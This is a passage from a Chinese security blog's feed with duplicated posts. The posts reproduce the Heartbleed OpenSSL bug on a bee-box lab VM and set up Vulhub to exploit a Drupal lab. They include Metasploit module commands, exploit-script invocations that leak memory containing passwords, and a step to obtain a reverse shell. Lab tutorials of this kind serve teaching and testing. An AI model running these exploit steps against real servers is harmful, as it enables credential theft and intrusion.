      <url>/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p><strong>CVE ID</strong>:</p><p>CVE-2014-0160</p><p><strong>漏洞范围</strong>：</p><p>OpenSSL1.0.1</p><p><strong>漏洞成因</strong>：</p><p>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p><a id="more"></a><p><strong>漏洞危害</strong>：</p><p>如同漏洞成因所讲，我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。</p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><p>环境： bee-box虚拟机(已集成该漏洞环境)<br>bee-box虚拟机下载地址：<a href="https://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">链接</a></p><h3 id="1-使用工具进行利用"><a href="#1-使用工具进行利用" class="headerlink" title="1. 使用工具进行利用"></a>1. 使用工具进行利用</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><ol><li><p>首先确定目标和端口信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556676583087.png" alt="1556676583087"></p><p>可以看到存在漏洞的端口为8443</p></li><li><p>使用nmap脚本进行漏洞检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.224.131</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556676900297.png" alt="1556676900297"></p><p>可以看到该漏洞存在</p></li></ol><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><ol><li><p>使用msf的exp进行漏洞利用</p><ol><li><p>打开msfconsole</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677575168.png" alt="1556677575168"></p></li><li><p>查找heartbleed模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677615995.png" alt="1556677615995"></p></li><li><p>使用第一个模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssl/openssl_heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677661603.png" alt="1556677661603"></p><p>第二个模块是用来</p></li><li><p>查看设置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshow options</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677730237.png" alt="1556677730237"></p></li><li><p>设置RHOST，RPORT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.11.59</span><br><span class="line">set RPORT 443</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677783208.png" alt="1556677783208"></p></li><li><p>设置VERBOSRE，值为true才能看到泄漏的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">set VERBOSE true</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677911981.png" alt="1556677911981"></p></li><li><p>执行paload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>如果有人正在登陆该web应用，可能获取到账号密码等信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556684475023.png" alt="1556684475023"></p><p>没有获取到数据是因为没有人登陆该应用或者登陆较少</p><p>下图是之前获取到数据的示例</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556679300981.png" alt="1556679300981"></p></li></ol></li></ol><h3 id="2-使用python脚本"><a href="#2-使用python脚本" class="headerlink" title="2. 使用python脚本"></a>2. 使用python脚本</h3><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/poc.py" target="_blank" rel="noopener">PoC</a></h4><p>修改 <code>poc.py</code> 中 <code>check</code> 函数的地址和端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">check(&apos;192.168.59.103&apos;, 443)</span><br></pre></td></tr></table></figure><p>然后执行poc.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br></pre></td></tr></table></figure><p>如果看到 <code>Heartbleed OpenSSL</code> 则代表存在漏洞。</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/exp.py" target="_blank" rel="noopener">Exp</a></h4><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 192.168.59.103</span><br></pre></td></tr></table></figure><p>读取到的信息在当前目录下的 <code>result.txt</code> 内。</p><blockquote><p>具体使用参数请使用 <code>python exp.py -h</code></p></blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/u/13c720cf85fc" target="_blank" rel="noopener">ch3ckr</a>： <a href="https://www.jianshu.com/p/08600e2f4530" target="_blank" rel="noopener">https://www.jianshu.com/p/08600e2f4530</a></p><p><a href="https://github.com/Medicean" target="_blank" rel="noopener">Medicean</a>：<a href="https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-0160-心脏滴血漏洞复现</title>
      <link href="/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p><strong>CVE ID</strong>:</p><p>CVE-2014-0160</p><p><strong>漏洞范围</strong>：</p><p>OpenSSL1.0.1</p><p><strong>漏洞成因</strong>：</p><p>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p><a id="more"></a><p><strong>漏洞危害</strong>：</p><p>如同漏洞成因所讲，我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。</p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><p>环境： bee-box虚拟机(已集成该漏洞环境)<br>bee-box虚拟机下载地址：<a href="https://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">链接</a></p><h3 id="1-使用工具进行利用"><a href="#1-使用工具进行利用" class="headerlink" title="1. 使用工具进行利用"></a>1. 使用工具进行利用</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><ol><li><p>首先确定目标和端口信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556676583087.png" alt="1556676583087"></p><p>可以看到存在漏洞的端口为8443</p></li><li><p>使用nmap脚本进行漏洞检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.224.131</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556676900297.png" alt="1556676900297"></p><p>可以看到该漏洞存在</p></li></ol><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><ol><li><p>使用msf的exp进行漏洞利用</p><ol><li><p>打开msfconsole</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556677575168.png" alt="1556677575168"></p></li><li><p>查找heartbleed模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556677615995.png" alt="1556677615995"></p></li><li><p>使用第一个模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssl/openssl_heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556677661603.png" alt="1556677661603"></p><p>第二个模块是用来</p></li><li><p>查看设置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshow options</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556677730237.png" alt="1556677730237"></p></li><li><p>设置RHOST，RPORT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.11.59</span><br><span class="line">set RPORT 443</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556677783208.png" alt="1556677783208"></p></li><li><p>设置VERBOSRE，值为true才能看到泄漏的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">set VERBOSE true</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556677911981.png" alt="1556677911981"></p></li><li><p>执行paload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>如果有人正在登陆该web应用，可能获取到账号密码等信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556684475023.png" alt="1556684475023"></p><p>没有获取到数据是因为没有人登陆该应用或者登陆较少</p><p>下图是之前获取到数据的示例</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞复现/CVE-2014-0160-心脏滴血漏洞/1556679300981.png" alt="1556679300981"></p></li></ol></li></ol><h3 id="2-使用python脚本"><a href="#2-使用python脚本" class="headerlink" title="2. 使用python脚本"></a>2. 使用python脚本</h3><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/poc.py" target="_blank" rel="noopener">PoC</a></h4><p>修改 <code>poc.py</code> 中 <code>check</code> 函数的地址和端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">check(&apos;192.168.59.103&apos;, 443)</span><br></pre></td></tr></table></figure><p>然后执行poc.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br></pre></td></tr></table></figure><p>如果看到 <code>Heartbleed OpenSSL</code> 则代表存在漏洞。</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/exp.py" target="_blank" rel="noopener">Exp</a></h4><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 192.168.59.103</span><br></pre></td></tr></table></figure><p>读取到的信息在当前目录下的 <code>result.txt</code> 内。</p><blockquote><p>具体使用参数请使用 <code>python exp.py -h</code></p></blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/u/13c720cf85fc" target="_blank" rel="noopener">ch3ckr</a>： <a href="https://www.jianshu.com/p/08600e2f4530" target="_blank" rel="noopener">https://www.jianshu.com/p/08600e2f4530</a></p><p><a href="https://github.com/Medicean" target="_blank" rel="noopener">Medicean</a>：<a href="https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub部署操作实例</title>
      <link href="/2019/04/28/Vulhub%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E5%AE%9E%E4%BE%8B/"/>
      <url>/2019/04/28/Vulhub%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Vulhub是一个基于<code>docker</code>和<code>docker-compose</code>的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><a id="more"></a><h2 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>配置国内加速器，可以更快的拉取镜像资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure><h2 id="三、安装docker-compose"><a href="#三、安装docker-compose" class="headerlink" title="三、安装docker-compose"></a>三、安装docker-compose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python//安装PIP</span><br><span class="line">pip install docker-compose//安装docker-compose</span><br></pre></td></tr></table></figure><h2 id="四、下载Vulhub"><a href="#四、下载Vulhub" class="headerlink" title="四、下载Vulhub"></a>四、下载Vulhub</h2><p>安装完成docker和docker-compose后，拉取Vulhub到本地任意目录即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>安装完成后，执行<code>docker-compose -v</code>，有返回则说明安装成功。</p><h2 id="五、启动漏洞环境"><a href="#五、启动漏洞环境" class="headerlink" title="五、启动漏洞环境"></a>五、启动漏洞环境</h2><p>docker-compose会自动查找当前目录下的配置文件（默认文件名为<code>docker-compose.yml</code>），并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p><p>在这里演示Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞，进入<code>drupal/CVE-2014-3704/</code>目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /your-Vuln-Path/drupal/CVE-2014-3704/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到Drupal的安装页面，使用默认配置安装即可。</p><p>其中，Mysql数据库名填写<code>drupal</code>，数据库用户名、密码为<code>root</code>，地址为<code>mysql</code>：</p><p><img src="/2019/04/28/Vulhub部署操作实例/使用Docker-Vulhub搭建漏洞测试靶场/1554803517373.png" alt="1554803517373"></p><p><img src="/2019/04/28/Vulhub部署操作实例/使用Docker-Vulhub搭建漏洞测试靶场/1554803658364.png" alt="1554803658364"></p><p>安装完成后，访问首页：</p><p><img src="/2019/04/28/Vulhub部署操作实例/使用Docker-Vulhub搭建漏洞测试靶场/1554803788919.png" alt="1554803788919"></p><h2 id="六、漏洞测试"><a href="#六、漏洞测试" class="headerlink" title="六、漏洞测试"></a>六、漏洞测试</h2><h3 id="1-cmsmap扫描cms漏洞"><a href="#1-cmsmap扫描cms漏洞" class="headerlink" title="1. cmsmap扫描cms漏洞"></a>1. cmsmap扫描cms漏洞</h3><ol><li><p>下载cmsmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap.git</span><br></pre></td></tr></table></figure></li><li><p>安装parse模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install parse</span><br></pre></td></tr></table></figure></li><li><p>使用python运行扫描脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmsmap.py http://192.168.10.18:8080</span><br></pre></td></tr></table></figure><p>得到漏洞详情</p><p><img src="/2019/04/28/Vulhub部署操作实例/使用Docker-Vulhub搭建漏洞测试靶场/1554804365543.png" alt="1554804365543"></p></li></ol><h3 id="2-使用metasploit进行漏洞利用"><a href="#2-使用metasploit进行漏洞利用" class="headerlink" title="2. 使用metasploit进行漏洞利用"></a>2. 使用metasploit进行漏洞利用</h3><ol><li><p>启动metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>搜索可利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2//使用该模块</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/Vulhub部署操作实例/使用Docker-Vulhub搭建漏洞测试靶场/1554807336176.png" alt="1554807336176"></p></li><li><p>设置配置参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show options//查看可配置选项</span><br><span class="line">set rhost 192.168.10.18//设置目标IP</span><br><span class="line">set rport 8080//设置目标端口</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/Vulhub部署操作实例/使用Docker-Vulhub搭建漏洞测试靶场/1554807568020.png" alt="1554807568020"></p></li><li><p>执行exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run//开始漏洞利用</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/Vulhub部署操作实例/使用Docker-Vulhub搭建漏洞测试靶场/1554807630335.png" alt="1554807630335"></p></li><li><p>获取反弹shell</p><p><img src="/2019/04/28/Vulhub部署操作实例/使用Docker-Vulhub搭建漏洞测试靶场/1554807710493.png" alt="1554807710493"></p></li></ol><h2 id="七、移除环境"><a href="#七、移除环境" class="headerlink" title="七、移除环境"></a>七、移除环境</h2><p>Vulhub中所有环境均为漏洞靶场，在测试结束后，请及时关闭并移除环境，避免被他人恶意利用。</p><p>漏洞测试结束后，返回到<code>drupal/CVE-2014-3704/</code>目录，执行如下命令移除环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><p>上述命令会执行如下几个动作：</p><ul><li>关闭正在运行的容器</li><li>删除所有相关容器</li><li>移除NAT（docker-compose在运行的时候会创建一个NAT网段）</li></ul><p>但不会移除编译好的漏洞镜像，下次再执行<code>docker-compose up -d</code>命令，就不需要再次编译相关镜像了。</p><p><strong>参考链接</strong>：</p><p>Vulhub官方文档：<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Docker+Vulhub搭建漏洞测试靶场</title>
      <link href="/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/"/>
      <url>/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Vulhub是一个基于<code>docker</code>和<code>docker-compose</code>的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><a id="more"></a><h2 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>配置国内加速器，可以更快的拉取镜像资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure><h2 id="三、安装docker-compose"><a href="#三、安装docker-compose" class="headerlink" title="三、安装docker-compose"></a>三、安装docker-compose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python//安装PIP</span><br><span class="line">pip install docker-compose//安装docker-compose</span><br></pre></td></tr></table></figure><h2 id="四、下载Vulhub"><a href="#四、下载Vulhub" class="headerlink" title="四、下载Vulhub"></a>四、下载Vulhub</h2><p>安装完成docker和docker-compose后，拉取Vulhub到本地任意目录即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>安装完成后，执行<code>docker-compose -v</code>，有返回则说明安装成功。</p><h2 id="五、启动漏洞环境"><a href="#五、启动漏洞环境" class="headerlink" title="五、启动漏洞环境"></a>五、启动漏洞环境</h2><p>docker-compose会自动查找当前目录下的配置文件（默认文件名为<code>docker-compose.yml</code>），并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p><p>在这里演示Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞，进入<code>drupal/CVE-2014-3704/</code>目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /your-Vuln-Path/drupal/CVE-2014-3704/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到Drupal的安装页面，使用默认配置安装即可。</p><p>其中，Mysql数据库名填写<code>drupal</code>，数据库用户名、密码为<code>root</code>，地址为<code>mysql</code>：</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803517373.png" alt="1554803517373"></p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803658364.png" alt="1554803658364"></p><p>安装完成后，访问首页：</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803788919.png" alt="1554803788919"></p><h2 id="六、漏洞测试"><a href="#六、漏洞测试" class="headerlink" title="六、漏洞测试"></a>六、漏洞测试</h2><h3 id="1-cmsmap扫描cms漏洞"><a href="#1-cmsmap扫描cms漏洞" class="headerlink" title="1. cmsmap扫描cms漏洞"></a>1. cmsmap扫描cms漏洞</h3><ol><li><p>下载cmsmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap.git</span><br></pre></td></tr></table></figure></li><li><p>安装parse模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install parse</span><br></pre></td></tr></table></figure></li><li><p>使用python运行扫描脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmsmap.py http://192.168.10.18:8080</span><br></pre></td></tr></table></figure><p>得到漏洞详情</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554804365543.png" alt="1554804365543"></p></li></ol><h3 id="2-使用metasploit进行漏洞利用"><a href="#2-使用metasploit进行漏洞利用" class="headerlink" title="2. 使用metasploit进行漏洞利用"></a>2. 使用metasploit进行漏洞利用</h3><ol><li><p>启动metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>搜索可利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2//使用该模块</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807336176.png" alt="1554807336176"></p></li><li><p>设置配置参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show options//查看可配置选项</span><br><span class="line">set rhost 192.168.10.18//设置目标IP</span><br><span class="line">set rport 8080//设置目标端口</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807568020.png" alt="1554807568020"></p></li><li><p>执行exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run//开始漏洞利用</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807630335.png" alt="1554807630335"></p></li><li><p>获取反弹shell</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807710493.png" alt="1554807710493"></p></li></ol><h2 id="七、移除环境"><a href="#七、移除环境" class="headerlink" title="七、移除环境"></a>七、移除环境</h2><p>Vulhub中所有环境均为漏洞靶场，在测试结束后，请及时关闭并移除环境，避免被他人恶意利用。</p><p>漏洞测试结束后，返回到<code>drupal/CVE-2014-3704/</code>目录，执行如下命令移除环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><p>上述命令会执行如下几个动作：</p><ul><li>关闭正在运行的容器</li><li>删除所有相关容器</li><li>移除NAT（docker-compose在运行的时候会创建一个NAT网段）</li></ul><p>但不会移除编译好的漏洞镜像，下次再执行<code>docker-compose up 